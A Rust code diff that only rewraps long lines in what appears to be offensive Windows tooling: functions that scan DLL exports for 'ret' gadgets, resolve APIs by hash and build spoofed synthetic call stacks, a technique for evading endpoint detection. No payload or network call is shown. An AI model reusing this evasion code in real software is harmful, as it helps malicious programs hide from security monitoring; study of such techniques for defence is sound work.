@@ -213,7 +213,8 @@ const SCAN_DLLS: &[&str] = &[
 
 /// Simple xorshift64 PRNG state for chain selection diversity.
 /// Not cryptographically secure — just needs uniform-ish distribution.
-static CHAIN_SELECT_STATE: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0x7FFF_BEEF_CAFE_DEAD);
+static CHAIN_SELECT_STATE: std::sync::atomic::AtomicU64 =
+    std::sync::atomic::AtomicU64::new(0x7FFF_BEEF_CAFE_DEAD);
 
 /// Return a pseudo-random index in [0, n).
 fn rand_index(n: usize) -> usize {
@@ -379,16 +380,15 @@ fn populate_gadget_cache() -> Vec<TransitGadget> {
 
 /// Ensure the gadget cache is populated.  Returns a locked reference.
 fn ensure_gadgets() -> &'static Mutex<Vec<TransitGadget>> {
-    GADGET_CACHE.get_or_init(|| {
-        Mutex::new(populate_gadget_cache())
-    })
+    GADGET_CACHE.get_or_init(|| Mutex::new(populate_gadget_cache()))
 }
 
 // ── Address database for return addresses ───────────────────────────────────
 
 /// Cached pool of valid return addresses from loaded-module exports.
 /// Keyed by module name, each value is a sorted list of function entry points.
-static RETURN_ADDR_DB: OnceLock<Mutex<std::collections::HashMap<String, Vec<usize>>>> = OnceLock::new();
+static RETURN_ADDR_DB: OnceLock<Mutex<std::collections::HashMap<String, Vec<usize>>>> =
+    OnceLock::new();
 
 /// Scan a DLL's export table for function entry points to use as return
 /// addresses.  Each entry point is verified to have valid unwind metadata.
@@ -446,7 +446,8 @@ fn scan_exports_for_return_addrs(dll_base: usize, dll_name: &str) -> Vec<usize> 
         // Scan for a `ret` (0xC3) within the first 64 bytes of the function.
         // The ret gadget becomes the return address — it's inside a real
         // function body and has valid unwind metadata.
-        let probe = unsafe { std::slice::from_raw_parts(func_addr as *const u8, 64.min(size - func_rva)) };
+        let probe =
+            unsafe { std::slice::from_raw_parts(func_addr as *const u8, 64.min(size - func_rva)) };
         for (i, &byte) in probe.iter().enumerate() {
             if byte == 0xC3 {
                 let ret_addr = func_addr + i;
@@ -498,9 +499,7 @@ fn populate_return_addr_db() -> std::collections::HashMap<String, Vec<usize>> {
 
 /// Ensure the return address database is populated.
 fn ensure_return_addr_db() -> &'static Mutex<std::collections::HashMap<String, Vec<usize>>> {
-    RETURN_ADDR_DB.get_or_init(|| {
-        Mutex::new(populate_return_addr_db())
-    })
+    RETURN_ADDR_DB.get_or_init(|| Mutex::new(populate_return_addr_db()))
 }
 
 // ── Chain templates for Win32 API calls ─────────────────────────────────────
@@ -624,13 +623,14 @@ pub fn build_spoofed_stack() -> Option<SyntheticCallChain> {
                 pe_resolve::hash_str(&name_bytes)
             };
 
-            let func_addr = match unsafe { pe_resolve::get_proc_address_by_hash(dll_base, func_hash) } {
-                Some(a) => a,
-                None => {
-                    all_resolved = false;
-                    break;
-                }
-            };
+            let func_addr =
+                match unsafe { pe_resolve::get_proc_address_by_hash(dll_base, func_hash) } {
+                    Some(a) => a,
+                    None => {
+                        all_resolved = false;
+                        break;
+                    }
+                };
 
             // Find a `ret` gadget within the function body for the return address
             let size = unsafe { pe_size_of_image(dll_base) };
